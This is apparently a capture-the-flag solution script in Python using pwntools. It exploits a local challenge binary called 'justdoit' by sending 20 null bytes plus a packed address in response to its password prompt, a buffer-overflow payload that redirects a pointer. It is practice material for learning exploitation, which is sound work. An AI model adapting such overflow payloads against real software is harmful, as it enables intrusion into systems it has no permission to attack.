#Import pwntools
from pwn import *

#Create the remote connection to the challenge
target = process('./justdoit')

#Print out the starting prompt
print(target.recvuntil("password.\n"))

#Create the payload
payload = b"\x00"*20 + p32(0x0804a080)

#Send the payload
target.sendline(payload)

#Drop to an interactive shell, so we can read everything the server prints out
target.interactive()
